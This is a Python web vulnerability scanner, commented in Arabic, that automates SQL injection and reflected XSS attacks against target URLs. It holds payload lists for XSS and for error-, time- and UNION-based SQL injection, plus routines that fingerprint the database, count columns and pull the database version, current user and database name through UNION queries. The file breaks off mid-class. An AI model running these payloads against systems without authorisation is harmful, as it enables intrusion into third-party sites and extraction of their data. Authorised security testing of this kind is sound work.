#!/usr/bin/env python3
# scanner.py — Phases 1+2 + Phase 3 (Concurrency & Throttling + Auto-Verify) + Phase 4 (Fingerprinting & Payload Tuning) + UNION-based Extraction + Phase 8 (Context-Aware XSS) + Phase 9 (Advanced Reflected XSS)
# Requirements: pip install requests beautifulsoup4

import argparse
import requests
import re
import time
import json as _json
from urllib.parse import urlparse, parse_qs, parse_qsl, urlencode, urlunparse, urljoin
from copy import deepcopy
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import json
from collections import deque
from bs4 import BeautifulSoup
import difflib  # <-- NEW: for similarity in blind SQLi phase
import html     # <-- Phase 9: for HTML decoding
import urllib.parse as urllib_parse  # <-- Phase 9: for URL decoding

# --- Default Config / payloads ---
SQL_PAYLOADS = ["'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "'; --", " OR 1=1--"]

# ملاحظــة: وسّعنا XSS_PAYLOADS ليشمل JS/attr payloads كمان عشان نقدر نعرّف XSS لو انعكست
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    '";alert(1);//',
    "';alert(1);//",
    "</script><script>alert(1)</script>",
    '" autofocus onfocus=alert(1) x="'
]

# Phase 8: Context-specific XSS payloads
CTX_XSS_PAYLOADS = {
    # HTML text context
    "html": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>"
    ],
    # Attribute context (breaking out of attribute value)
    "attr": [
        "\"><script>alert(1)</script>",
        '" autofocus onfocus=alert(1) x="'
    ],
    # JavaScript context
    "js": [
        '";alert(1);//',
        "';alert(1);//",
        "</script><script>alert(1)</script>"
    ]
}

# --- Phase 9: Advanced Reflected XSS smart payloads ---
XSS_SMART_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'\"><img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<body onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe srcdoc='<script>alert(1)</script>'>",
]

XSS_KEY_PARTS = [
    "script",
    "onerror",
    "onload",
    "alert",
    "<img",
    "<svg",
    "<iframe",
    "srcdoc",
    "javascript:"
]

HTML_ENCODE_MARKERS = ["&lt;", "&gt;", "&quot;", "&#", "&amp;"]

SQL_ERR_PATTERNS = [
    r"you have an error in your sql syntax",
    r"warning: mysql",
    r"unclosed quotation mark after the character string",
    r"syntax error.*mysql",
    r"pg_query\(",
]
SQL_ERR_RE = re.compile("|".join(SQL_ERR_PATTERNS), re.IGNORECASE)

# --- NEW: DB-specific error signatures for DBMS fingerprinting ---
DB_ERROR_SIGNATURES = {
    "mysql": [
        r"you have an error in your sql syntax",
        r"mysql server version for the right syntax",
        r"warning: mysql_?",
        r"mysqli?_",
        r"pdo_mysql"
    ],
    "mariadb": [
        r"mariadb server version for the right syntax",
        r"mariadb"
    ],
    "mssql": [
        r"unclosed quotation mark after the character string",
        r"microsoft sql server",
        r"sql server native client",
        r"odbc sql server driver",
        r"\[sql server\]",
        r"microsoft ole db provider for sql server"
    ],
    "postgresql": [
        r"pg::syntaxerror",
        r"psql:\s*error",
        r"org\.postgresql",
        r"postgresql.*error",
        r"error:\s+syntax error at or near"
    ],
    "oracle": [
        r"ora-\d{5}",
        r"oracle error",
        r"oracle database",
        r"quoted string not properly terminated"
    ]
}

# --- NEW: Active DB-specific error signatures for DBMS fingerprinting ---
ACTIVE_FP_PAYLOADS = [
    "'\")))))",
    "' AND 1=CONVERT(INT,@@version)--",
    "'; SELECT pg_sleep(0); --",
    "'||(SELECT 1/0)||'"
]

# --- Phase 2: Time-based SQLi payloads ---
TIME_SSQLI_PAYLOADS = {
    "mysql": [
        "' OR SLEEP({delay})-- -",
        "\" OR SLEEP({delay})-- -",
        "1) OR SLEEP({delay})-- -",
    ],
    "mssql": [
        "'; WAITFOR DELAY '0:0:{delay}'--",
        "\"; WAITFOR DELAY '0:0:{delay}'--",
    ],
    "postgresql": [
        "'; SELECT pg_sleep({delay});--",
        "\"; SELECT pg_sleep({delay});--",
    ],
    "generic": [
        "' AND IF(1=1,SLEEP({delay}),0)-- -"
    ]
}

# --- Phase 3b: UNION-based SQLi extraction (DB version/user/database) ---

DB_UNION_EXPRS = {
    "mysql": {
        "version": "CONCAT('SCNVER:',@@version,':ENDSCN')",
        "user":    "CONCAT('SCNUSER:',USER(),':ENDSCN')",
        "db":      "CONCAT('SCNDB:',DATABASE(),':ENDSCN')",
    },
    "postgresql": {
        "version": "('SCNVER:' || version() || ':ENDSCN')",
        "user":    "('SCNUSER:' || current_user || ':ENDSCN')",
        "db":      "('SCNDB:' || current_database() || ':ENDSCN')",
    },
    "mssql": {
        "version": "('SCNVER:' + CAST(@@version AS NVARCHAR(4000)) + ':ENDSCN')",
        "user":    "('SCNUSER:' + SYSTEM_USER + ':ENDSCN')",
        "db":      "('SCNDB:' + DB_NAME() + ':ENDSCN')",
    },
}

def _looks_numeric_simple(v):
    try:
        float(v)
        return True
    except Exception:
        return False

def _build_order_by_value(original_value, n):
    """
    يبني قيمة للباراميتر مع ORDER BY n.
    يحاول يتعامل بشكل بسيط مع الأرقام/السترنغ.
    """
    original_value = original_value or ""
    if _looks_numeric_simple(original_value):
        return f"{original_value} ORDER BY {n}-- "
    else:
        # نفترض أنه داخل كويري سترنغ، منضيف ' ونسكرها
        return f"{original_value}' ORDER BY {n}-- -"

def _build_union_value(original_value, select_list):
    """
    يبني قيمة للباراميتر مع UNION ALL SELECT <select_list>.
    """
    original_value = original_value or ""
    if _looks_numeric_simple(original_value):
        return f"{original_value} UNION ALL SELECT {select_list}-- "
    else:
        return f"{original_value}' UNION ALL SELECT {select_list}-- -"

def _make_param_url(method, base_url, params, param_name, injected_value, post_data=None, headers=None):
    """
    يبني URL جديد مع القيمة المحقونة في param_name ويرسل الطلب.
    (GET فقط في هذا الفيز لسهولة التنفيذ)
    """
    parsed = urlparse(base_url)
    new_params = deepcopy(params) if params else {}
    new_params[param_name] = [injected_value]
    query = urlencode({k: v[0] for k, v in new_params.items()}, doseq=False)
    new_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query, parsed.fragment))
    r = request_with_timeout("GET", new_url, headers=headers)
    return new_url, r

# Will be overridden by args
TIMEOUT = 10
REPORT_FILE = "report.txt"
REPORT_JSON = "report.json"
AUTO_VERIFY = False
LENGTH_DIFF_THRESHOLD = 0.30  # can be overridden by --len-threshold

# (3) حد أقصى لتجارب حقن الهيدرز لتفادي انفجار النتائج
MAX_HEADER_TRIES = 6

# --- Phase 3: Global Rate Limiter ---
class RateLimiter:
    def __init__(self, delay_seconds: float):
        self.delay = max(0.0, delay_seconds or 0.0)
        self._lock = threading.Lock()
        self._last = 0.0

    def wait(self):
        if self.delay <= 0:
            return
        with self._lock:
            now = time.time()
            nxt = self._last + self.delay
            if nxt > now:
                time.sleep(nxt - now)
                now = time.time()
            self._last = now

RATE_LIMITER = RateLimiter(0.0)

# --- Helpers ---
def now_ts():
    return datetime.now(timezone.utc).isoformat()

def log(msg):
    print(msg)
    try:
        with open(REPORT_FILE, "a", encoding="utf-8") as f:
            f.write(msg + "\n")
    except Exception:
        pass

def is_sql_error(text):
    return bool(text and SQL_ERR_RE.search(text))

def request_with_timeout(method, url, params=None, data=None, headers=None, json_body=None):
    try:
        RATE_LIMITER.wait()  # Phase 3 throttling
        if method.upper() == "POST":
            if json_body is not None:
                r = requests.post(url, params=params, json=json_body, headers=headers, timeout=TIMEOUT, allow_redirects=True)
            else:
                r = requests.post(url, params=params, data=data, headers=headers, timeout=TIMEOUT, allow_redirects=True)
        else:
            r = requests.get(url, params=params, headers=headers, timeout=TIMEOUT, allow_redirects=True)
        return r
    except Exception:
        return None

def baseline_response(method, url, params=None, data=None, headers=None, json_body=None):
    """
    Returns: (status_code, text, headers_dict) or (None, None, None) on failure
    """
    r = request_with_timeout(method, url, params=params, data=data, headers=headers, json_body=json_body)
    if not r:
        return None, None, None
    try:
        hdrs = {k: v for k, v in r.headers.items()}
    except Exception:
        hdrs = {}
    return r.status_code, (r.text or ""), hdrs

# --- NEW: Active DBMS fingerprinting (forced-error probing) ---
def active_db_fingerprint(method, url, params, headers=None, verbose=False):
    """
    Phase 4 (Active) – يحاول يسبب أخطاء SQL متعمدة عشان يحدد نوع الـ DB من رسائل الخطأ.
    - يحقن ACTIVE_FP_PAYLOADS في كل بارام واحد واحد
    - يحلل النص حسب DB_ERROR_SIGNATURES
    يرجّع: (db_guess or None, evidence_list)
    """
    evidence = []
    scores = []

    scores = {}
    if not params:
        return None, evidence

    parsed = urlparse(url)

    for pname, values in params.items():
        original = values[0] if values else ""
        for pl in ACTIVE_FP_PAYLOADS:
            new_params = deepcopy(params)
            new_params[pname] = [str(original) + pl]
            q = urlencode({k: v[0] for k, v in new_params.items()}, doseq=False)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, q, parsed.fragment))

            r = request_with_timeout(method, test_url, headers=headers)
            if not r:
                continue

            body = (r.text or "").lower()
            for dbms, patterns in DB_ERROR_SIGNATURES.items():
                for p in patterns:
                    try:
                        if re.search(p, body):
                            scores[dbms] = scores.get(dbms, 0) + 1
                            evidence.append(
                                f"active-fp: param={pname}, payload={pl!r}, url={test_url}, matched /{p}/ for {dbms}"
                            )
                    except re.error:
                        continue

    if not scores:
        return None, evidence

    best_db = max(scores, key=scores.get)
    evidence.append(f"active-fp result: best_db={best_db} with score={scores[best_db]}")
    if verbose:
        log(f"[ACTIVE-FP] Active fingerprint scores: {scores}, chosen={best_db}")

    return best_db, evidence

# (4) تنقية الاستجابة قبل المقارنة لتقليل الضجيج من أجزاء ديناميكية
DYNAMIC_PATTERNS = [
    r"\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}Z",  # ISO timestamps
    r"\b[0-9a-f]{8,64}\b",                    # hashes/uuids
    r"\b\d{2,6}\b",                           # أرقام قصيرة شائعة
]

def normalize_response(text: str) -> str:
    if not text:
        return ""
    t = text
    for pat in DYNAMIC_PATTERNS:
        try:
            t = re.sub(pat, "", t, flags=re.IGNORECASE)
        except re.error:
            continue
    return t

def length_change_ratio(base_text, new_text):
    if base_text is None or new_text is None:
        return 0.0
    b = len(base_text); n = len(new_text)
    if b == 0:
        return abs(n)
    return abs(n - b) / b

# --- Phase 9: Advanced Reflected XSS helpers & phase ---

def index_to_line_col(text: str, idx: int):
    """
    تحويل index إلى (line, column) 1-based
    """
    line = text.count("\n", 0, idx) + 1
    last_nl = text.rfind("\n", 0, idx)
    if last_nl == -1:
        col = idx + 1
    else:
        col = idx - last_nl
    return line, col

def detect_reflection_context_adv(text: str, idx: int) -> str:
    """
    نحاول نخمّن الـ context لحقن XSS:
    - HTML Attribute
    - JavaScript
    - HTML Tag Body
    - URL / Attribute
    - Unknown
    """
    window_before = text[max(0, idx - 80):idx].lower()
    window_after = text[idx:idx + 80].lower()

    # داخل attribute مثل: <tag attr="PAYLOAD">
    if '="' in window_before or "='" in window_before:
        return "HTML Attribute"

    # داخل <script> ... PAYLOAD ... </script>
    if "<script" in window_before:
        return "JavaScript Context"

    # داخل tag body مثل: <div>PAYLOAD</div>
    if "<" in window_before and ">" in window_after:
        return "HTML Tag Body"

    # داخل URL مثل: href="...PAYLOAD..."
    if "href=" in window_before or "src=" in window_before:
        return "URL / Attribute"

    return "Unknown"

def find_reflections_for_payload(payload: str, response_text: str):
    """
    - يفحص raw + html_unescape + url_unquote+html_unescape
    - يسجّل exact + partial matches مع (line, col, context)
    """
    results = []

    if response_text is None:
        return results

    layers = [
        ("raw", response_text),
        ("html_unescape", html.unescape(response_text)),
        ("url_unquote+html_unescape", html.unescape(urllib_parse.unquote(response_text)))
    ]

    for layer_name, text in layers:
        if not text:
            continue

        # Exact match
        start_idx = text.find(payload)
        if start_idx != -1:
            line, col = index_to_line_col(text, start_idx)
            context = detect_reflection_context_adv(text, start_idx)
            encoded = any(m in response_text for m in HTML_ENCODE_MARKERS)
            results.append({
                "match_type": "exact",
                "layer": layer_name,
                "payload": payload,
                "matched_string": payload,
                "line": line,
                "column": col,
                "context": context,
                "html_encoded": encoded,
            })

        # Partial (key parts)
        text_low = text.lower()
        for key in XSS_KEY_PARTS:
            key_low = key.lower()
            idx = text_low.find(key_low)
            if idx != -1:
                line, col = index_to_line_col(text, idx)
                context = detect_reflection_context_adv(text, idx)
                encoded = any(m in response_text for m in HTML_ENCODE_MARKERS)
                results.append({
                    "match_type": "partial",
                    "layer": layer_name,
                    "payload": payload,
                    "matched_string": key,
                    "line": line,
                    "column": col,
                    "context": context,
                    "html_encoded": encoded,
                })

    return results

def guess_xss_severity_from_context(context: str) -> str:
    ctx = (context or "").lower()
    if "javascript" in ctx:
        return "high"
    if "attribute" in ctx or "url" in ctx:
        return "medium"
    return "low"

def run_advanced_reflected_xss_phase(method, url, params, headers, base_text_raw, fingerprint, verbose=False):
    """
    Phase 9 — Advanced Reflected XSS:
    - يستخدم XSS_SMART_PAYLOADS على كل باراميتر
    - يفحص reflection (raw + decoded + partial)
    - يحدّد line/column/context
    - يرجّع findings بنفس فورمات بقية الفيزات (وتروح للـ JSON)
    """
    findings = []
    method = method.upper()
    if not params:
        return findings

    parsed = urlparse(url)
    base_len = len(base_text_raw or "")

    for param_name, values in params.items():
        original_value = values[0] if values else ""

        for payload in XSS_SMART_PAYLOADS:
            test_params = deepcopy(params)
            test_params[param_name] = [f"{original_value}{payload}"]
            query = urlencode({k: v[0] for k, v in test_params.items()}, doseq=False)
            inj_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query, parsed.fragment))

            resp = request_with_timeout(method, inj_url, headers=headers)
            if not resp:
                continue

            body = resp.text or ""
            reflections = find_reflections_for_payload(payload, body)
            if not reflections:
                continue

            # نختار أفضل reflection: exact أولاً ثم partial
            best = sorted(reflections, key=lambda r: 0 if r["match_type"] == "exact" else 1)[0]
            ctx = best["context"]
            severity = guess_xss_severity_from_context(ctx)

            if severity == "high":
                base_conf = 50
                score_delta = 45
            elif severity == "medium":
                base_conf = 40
                score_delta = 35
            else:
                base_conf = 30
                score_delta = 25

            verify_result = {
                "verified": True,
                "evidence": (
                    f"Reflected XSS payload at line {best['line']}, column {best['column']} "
                    f"in {ctx} (match={best['match_type']}, layer={best['layer']})"
                ),
                "score_delta": score_delta,
                "elapsed": 0.0
            }

            score = compute_score(
                base_confidence=base_conf,
                fingerprint=fingerprint,
                verify_result=verify_result,
                payload=payload
            )

            status_label = "confirmed" if score >= 50 else ("probable" if score >= 30 else "low")

            finding = {
                "timestamp": now_ts(),
                "url": url,
                "test_url": inj_url,
                "method": method,
                "injected_param": param_name,
                "payload": payload,
                "vuln_type": "Reflected XSS",
                "reason": verify_result["evidence"],
                "status_code": resp.status_code,
                "auto_verified": True,
                "verify": verify_result,
                "fingerprint": fingerprint or {},
                "score": score,
                "status": status_label,
                "base_len": base_len,
                "resp_len": len(body or ""),
                "extra": {
                    "xss_match_type": best["match_type"],
                    "xss_layer": best["layer"],
                    "xss_context": ctx,
                    "xss_line": best["line"],
                    "xss_column": best["column"],
                    "xss_html_encoded": best["html_encoded"],
                    "xss_matched_string": best["matched_string"],
                }
            }

            if verbose:
                log(
                    f"[XSS-REFLECTED][{severity.upper()}] {url} "
                    f"param={param_name} ctx={ctx} line={best['line']} col={best['column']} payload={payload}"
                )

            findings.append(finding)
            # نكتفي بأول payload ناجح لكل باراميتر (لتقليل الضجيج)
            break

    return findings

# --- Phase 2: Time-based SQLi helpers ---

def _pick_db_key_from_fingerprint(fp):
    db = (fp or {}).get("database") or ""
    db = (db or "").lower()
    if "mysql" in db or "maria" in db:
        return "mysql"
    if "postgres" in db:
        return "postgresql"
    if "mssql" in db or "sql server" in db:
        return "mssql"
    return "generic"

def measure_avg_response_time(method, url, headers=None, data=None, json_body=None, samples=3):
    """
    يقيس متوسط زمن الاستجابة لطلب معيّن (مع أخذ الـ RateLimiter بالحسبان).
    يرجّع: (avg_time, last_status_code, last_resp_len) أو (None, None, None)
    """
    times = []
    last_status = None
    last_len = 0
    for _ in range(max(1, samples)):
        t0 = time.time()
        r = request_with_timeout(method, url, headers=headers, data=data, json_body=json_body)
        if not r:
            continue
        dt = time.time() - t0
        times.append(dt)
        last_status = r.status_code
        last_len = len(r.text or "")
    if not times:
        return None, None, None
    avg = sum(times) / len(times)
    return avg, last_status, last_len

def run_time_based_sqli_phase(method, url, params, headers, json_body, post_data,
                              fingerprint, time_delay, time_threshold, time_samples, verbose=False):
    """
    Phase 2 — Time-based SQLi:
    - يحسب baseline avg time للـ URL بدون حقن
    - لكل باراميتر في الـ query: يحقن payloads فيها delay
    - إذا avg_injected >= baseline + threshold → Time-based SQLi (confirmed)
    """
    findings = []
    method = method.upper()

    if not params:
        return findings

    # اختيار نوع الـ DB من الـ fingerprint لاختيار الـ payloads الأنسب
    db_key = _pick_db_key_from_fingerprint(fingerprint)
    payload_templates = TIME_SSQLI_PAYLOADS.get(db_key, TIME_SSQLI_PAYLOADS["generic"])

    # baseline time للطلب الأصلي
    baseline_avg, base_status, base_len = measure_avg_response_time(
        method, url, headers=headers,
        data=post_data if method == "POST" else None,
        json_body=json_body if method == "POST" and json_body is not None else None,
        samples=time_samples
    )
    if baseline_avg is None:
        return findings

    if verbose:
        log(f"[TIME] Baseline avg for {url}: {baseline_avg:.3f}s (samples={time_samples})")

    parsed = urlparse(url)

    for param_name, values in params.items():
        original_value = values[0] if values else ""
        for tmpl in payload_templates:
            injected_value = f"{original_value}{tmpl.format(delay=time_delay)}"
            new_params = deepcopy(params)
            new_params[param_name] = [injected_value]
            query = urlencode({k: v[0] for k, v in new_params.items()}, doseq=False)
            inj_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query, parsed.fragment))

            inj_avg, inj_status, inj_len = measure_avg_response_time(
                method, inj_url, headers=headers,
                data=post_data if method == "POST" else None,
                json_body=json_body if method == "POST" and json_body is not None else None,
                samples=time_samples
            )
            if inj_avg is None:
                continue

            if verbose:
                log(f"[TIME] Param '{param_name}' payload '{tmpl.format(delay=time_delay)}': "
                    f"avg={inj_avg:.3f}s vs baseline={baseline_avg:.3f}s")

            # الشرط الأساسي: زيادة زمن الاستجابة بمقدار threshold أو أكثر
            if inj_avg >= baseline_avg + time_threshold:
                verify_result = {
                    "verified": True,
                    "evidence": f"time-based delay: baseline≈{baseline_avg:.2f}s, injected≈{inj_avg:.2f}s (threshold={time_threshold:.2f}s)",
                    "score_delta": 50,
                    "elapsed": inj_avg
                }
                payload_str = tmpl.format(delay=time_delay)
                score = compute_score(
                    base_confidence=40,
                    fingerprint=fingerprint,
                    verify_result=verify_result,
                    payload=payload_str
                )
                status_label = "confirmed" if score >= 50 else "probable"
                finding = {
                    "timestamp": now_ts(),
                    "url": url,
                    "test_url": inj_url,
                    "method": method,
                    "injected_param": param_name,
                    "payload": payload_str,
                    "vuln_type": "Time-based SQLi",
                    "reason": f"response time increased from {baseline_avg:.2f}s to {inj_avg:.2f}s (threshold {time_threshold:.2f}s)",
                    "status_code": inj_status,
                    "auto_verified": True,
                    "verify": verify_result,
                    "fingerprint": fingerprint or {},
                    "score": score,
                    "status": status_label,
                    "base_len": int(base_len or 0),
                    "resp_len": int(inj_len or 0)
                }
                log(f"[VULN] Time-based SQLi on {url} param '{param_name}' payload: {payload_str} "
                    f"(baseline≈{baseline_avg:.2f}s, injected≈{inj_avg:.2f}s, score={score}) [AUTO-VERIFIED]")
                findings.append(finding)
                # ما نكمّل باقي الـ payloads على نفس الباراميتر
                break

    return findings

# --- Phase 3b: UNION-based SQLi helpers & phase ---

def _detect_column_count_order_by(method, url, params, param_name, headers, base_status, base_text_raw, max_cols=8, verbose=False):
    """
    يحاول يكتشف عدد الأعمدة باستخدام ORDER BY 1,2,3,... 
    يرجع: عدد الأعمدة أو None.
    """
    base_norm = normalize_response(base_text_raw or "")
    for n in range(1, max_cols + 1):
        inj_val = _build_order_by_value(params.get(param_name, ["1"])[0], n)
        test_url, r = _make_param_url(method, url, params, param_name, inj_val, headers=headers)
        if not r:
            if verbose:
                log(f"[UNION] ORDER BY {n} failed for {test_url}")
            break
        text = r.text or ""
        norm = normalize_response(text)
        len_ratio = length_change_ratio(base_norm, norm)
        # أول نقطة يبدأ فيها الاختلاف الكبير → n-1 هو عدد الأعمدة
        if r.status_code != base_status or len_ratio > 0.40 or is_sql_error(text):
            if n == 1:
                if verbose:
                    log(f"[UNION] ORDER BY 1 already breaks on {url} param {param_name}, skipping.")
                return None
            if verbose:
                log(f"[UNION] Column count for {url} param {param_name} ≈ {n-1}")
            return n - 1
    return None

def _test_union_compatible(method, url, params, param_name, headers, base_status, base_text_raw, col_count, verbose=False):
    """
    يتأكد أن UNION ALL SELECT NULL,... يشتغل بدون error كبير.
    """
    nulls = ",".join(["NULL"] * col_count)
    original_value = params.get(param_name, ["1"])[0]
    inj_val = _build_union_value(original_value, nulls)
    test_url, r = _make_param_url(method, url, params, param_name, inj_val, headers=headers)
    if not r:
        return False
    text = r.text or ""
    norm = normalize_response(text)
    base_norm = normalize_response(base_text_raw or "")
    len_ratio = length_change_ratio(base_norm, norm)
    if verbose:
        log(f"[UNION] UNION NULLs test for {url} param {param_name}: status={r.status_code}, len_ratio={len_ratio:.2f}")
    if r.status_code >= 500 or is_sql_error(text):
        return False
    return True

def _find_reflected_columns_union(method, url, params, param_name, headers, col_count, verbose=False):
    """
    يعمل UNION SELECT 'MK1','MK2',... ويشوف أي الأعمدة تنعرض في HTML.
    يرجع list indices مثل [1,3].
    """
    markers = [f"UNIONCOL_{i}_SCN" for i in range(1, col_count + 1)]
    select_list = ",".join([f"'{m}'" for m in markers])
    original_value = params.get(param_name, ["1"])[0]
    inj_val = _build_union_value(original_value, select_list)
    test_url, r = _make_param_url("GET", url, params, param_name, inj_val, headers=headers)
    if not r:
        return []
    body = r.text or ""
    reflected = []
    for i, m in enumerate(markers, start=1):
        if m in body:
            reflected.append(i)
    if verbose:
        log(f"[UNION] Reflected columns for {url} param {param_name}: {reflected}")
    return reflected

def _build_union_select_expr(expr, col_count, reflected_idx):
    """
    يبني لستة الأعمدة بحيث expr يكون في العمود المنعكس، والباقي NULL.
    """
    cols = []
    for i in range(1, col_count + 1):
        if i == reflected_idx:
            cols.append(expr)
        else:
            cols.append("NULL")
    return ",".join(cols)

def _extract_marker_from_body(body, marker_prefix):
    """
    يبحث عن SCNVER:....:ENDSCN ويستخرج المحتوى اللي بالنص.
    """
    if not body:
        return None
    pattern = re.escape(marker_prefix) + r"(.*?)" + re.escape(":ENDSCN")
    m = re.search(pattern, body, re.DOTALL | re.IGNORECASE)
    if not m:
        return None
    return m.group(1).strip()

def run_union_extraction_phase(method, url, params, headers, json_body, post_data,
                               fingerprint, base_status, base_text_raw, verbose=False):
    """
    Phase 3b — UNION-based SQLi Extraction:
    - ORDER BY n → عدد الأعمدة
    - UNION ALL SELECT NULL,... → تأكيد
    - UNION SELECT <markers> → أعمدة منعكسة
    - UNION SELECT expr(version/user/db) → استخراج معلومات DB
    يرجّع list findings (بنفس شكل بقية الفايندينغز).
    """
    findings = []
    method = method.upper()

    # حالياً: GET + query params فقط
    if method != "GET" or not params or json_body is not None:
        return findings

    db_key = _pick_db_key_from_fingerprint(fingerprint)
    union_exprs = DB_UNION_EXPRS.get(db_key)
    if not union_exprs:
        # لو ما عرفنا نوع DB، نفترض MySQL
        union_exprs = DB_UNION_EXPRS.get("mysql")
        db_key = "mysql"

    for param_name, values in params.items():
        original_value = values[0] if values else ""
        if verbose:
            log(f"[UNION] Trying UNION phase on {url} param {param_name}")

        # 1) عدد الأعمدة
        col_count = _detect_column_count_order_by(method, url, params, param_name, headers,
                                                  base_status, base_text_raw, max_cols=8, verbose=verbose)
        if not col_count or col_count < 1:
            continue

        # 2) تأكيد UNION ALL SELECT NULL,...
        if not _test_union_compatible(method, url, params, param_name, headers,
                                      base_status, base_text_raw, col_count, verbose=verbose):
            continue

        # 3) أعمدة منعكسة
        reflected_cols = _find_reflected_columns_union(method, url, params, param_name, headers,
                                                       col_count, verbose=verbose)
        if not reflected_cols:
            continue

        reflected_idx = reflected_cols[0]  # نأخذ أول واحد كفاية

        db_info = {
            "db_type": db_key,
            "db_version": None,
            "current_user": None,
            "current_database": None
        }

        last_status = base_status
        last_test_url = url

        # 4) استخراج version / user / db
        for tag, marker_prefix in [("version", "SCNVER:"), ("user", "SCNUSER:"), ("db", "SCNDB:")]:
            expr = union_exprs.get(tag)
            if not expr:
                continue
            select_list = _build_union_select_expr(expr, col_count, reflected_idx)
            inj_val = _build_union_value(original_value, select_list)
            test_url, r = _make_param_url(method, url, params, param_name, inj_val, headers=headers)
            if not r:
                continue
            body = r.text or ""
            last_status = r.status_code
            last_test_url = test_url
            val = _extract_marker_from_body(body, marker_prefix)
            if verbose:
                log(f"[UNION] Extract {tag} for {url} param {param_name}: {val}")
            if tag == "version":
                db_info["db_version"] = val
            elif tag == "user":
                db_info["current_user"] = val
            elif tag == "db":
                db_info["current_database"] = val

        # إذا ما طلع ولا واحد، ما نضيف فايندينغ
        if not (db_info["db_version"] or db_info["current_user"] or db_info["current_database"]):
            continue

        verify_result = {
            "verified": True,
            "evidence": "UNION-based extraction with SCN* markers succeeded",
            "score_delta": 60,
            "elapsed": 0.0
        }
        score = compute_score(base_confidence=50, fingerprint=fingerprint,
                              verify_result=verify_result, payload="[UNION_EXTRACT]")
        finding = {
            "timestamp": now_ts(),
            "url": url,
            "test_url": last_test_url,
            "method": method,
            "injected_param": param_name,
            "payload": "[UNION_EXTRACT]",
            "vuln_type": "SQLi-UNION",
            "reason": (
                f"UNION-based SQLi confirmed; cols={col_count}, reflected={reflected_cols}, "
                f"version={db_info['db_version']}, user={db_info['current_user']}, db={db_info['current_database']}"
            ),
            "status_code": last_status,
            "auto_verified": True,
            "verify": verify_result,
            "fingerprint": fingerprint or {},
            "score": score,
            "status": "confirmed",
            "base_len": len(normalize_response(base_text_raw or "")),
            "resp_len": 0,
            "db_info": db_info,
            "union_meta": {
                "column_count": col_count,
                "reflected_columns": reflected_cols
            }
        }
        log(f"[VULN] SQLi-UNION on {url} param '{param_name}' "
            f"(version={db_info['db_version']}, user={db_info['current_user']}, db={db_info['current_database']}, score={score}) [AUTO-VERIFIED]")
        findings.append(finding)

    return findings

# --- Phase 8: Context-Aware XSS helpers & phase ---

def detect_xss_context(html: str, marker: str):
    """
    يحلل مكان الـ marker داخل الصفحة:
    - js  : داخل <script> ... </script>
    - attr: داخل attribute value مثل name="...marker..."
    - html: نص HTML عادي
    يرجع: 'js' أو 'attr' أو 'html' أو None
    """
    if not html or marker not in html:
        return None

    idx = html.find(marker)
    if idx == -1:
        return None

    # 1) JavaScript context: بين <script> و </script>
    open_idx = html.rfind("<script", 0, idx)
    close_idx = html.rfind("</script", 0, idx)
    if open_idx != -1 and (close_idx == -1 or close_idx < open_idx):
        return "js"

    # 2) Attribute context: ضمن name="...marker..."
    window = 120
    start = max(0, idx - window)
    end = min(len(html), idx + window)
    snippet = html[start:end]
    attr_re = re.compile(
        r"\b[\w:-]+\s*=\s*(['\"]).*?" + re.escape(marker) + r".*?\1",
        re.DOTALL | re.IGNORECASE
    )
    if attr_re.search(snippet):
        return "attr"

    # 3) Default: HTML text
    return "html"

def run_context_aware_xss_phase(method, url, params, headers, json_body, post_data,
                                base_status, base_text, verbose=False, fingerprint=None):
    """
    Phase 8 — Context-Aware XSS Detection:
    - لكل باراميتر (GET):
      1) نحقن marker بسيط
      2) نشوف وين انعكس (HTML / Attribute / JS)
      3) نختار payloads من CTX_XSS_PAYLOADS حسب الـ context
      4) نستخدم _single_injection_attempt لكل payload
    """
    findings = []
    method = method.upper()
    if method != "GET" or not params or json_body is not None:
        return findings

    parsed = urlparse(url)

    for param_name, values in params.items():
        original_value = values[0] if values else ""
        marker = f"CTX_XSS_{param_name}_{int(time.time() * 1000)}"
        # نبني URL مع marker
        new_params = deepcopy(params)
        new_params[param_name] = [marker]
        query = urlencode({k: v[0] for k, v in new_params.items()}, doseq=False)
        marker_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query, parsed.fragment))

        r = request_with_timeout(method, marker_url, headers=headers)
        if not r or r.status_code >= 500:
            continue

        body = r.text or ""
        if marker not in body:
            # marker مش منعكس → ما نقدر نحدد سياق
            continue

        ctx = detect_xss_context(body, marker)
        if verbose:
            log(f"[CTX-XSS] {url} param '{param_name}' marker reflected in context={ctx}")

        if not ctx:
            continue

        payloads = CTX_XSS_PAYLOADS.get(ctx, [])
        if not payloads:
            continue

        # نستخدم نفس ال baseline (base_text) اللي محسوب مسبقاً
        for pl in payloads:
            f = _single_injection_attempt(
                method=method,
                url=url,
                param_name=param_name,
                original_params=params,
                base_text=base_text,
                base_status=base_status,
                payload=pl,
                post_data=post_data,
                headers=headers,
                json_body=None,
                json_key=None,
                verbose=verbose,
                fingerprint=fingerprint
            )
            if f:
                # نضيف معلومات السياق داخل extra.xss_context
                extra = f.get("extra") or {}
                extra["xss_context"] = ctx
                f["extra"] = extra
                findings.append(f)

    return findings

# --- Phase 1: Blind Boolean-based SQLi detector (AND 1=1 vs AND 1=2) ---
class BlindBooleanSQLiPhase:
    """
    Phase 1 – Boolean-based Blind SQLi:
    - لكل باراميتر في الـ query string:
      baseline, AND 1=1, AND 1=2 (مع retries)
    - نقارن length + similarity
    - لو base ≈ true و false مختلف → Potential Blind SQLi
    """
    def __init__(self, retries=3, length_diff_ratio=0.15, similarity_threshold=0.97):
        self.retries = max(1, retries)
        self.length_diff_ratio = length_diff_ratio
        self.similarity_threshold = similarity_threshold

    def _send_retriable(self, method, url, headers=None):
        lengths = []
        bodies = []
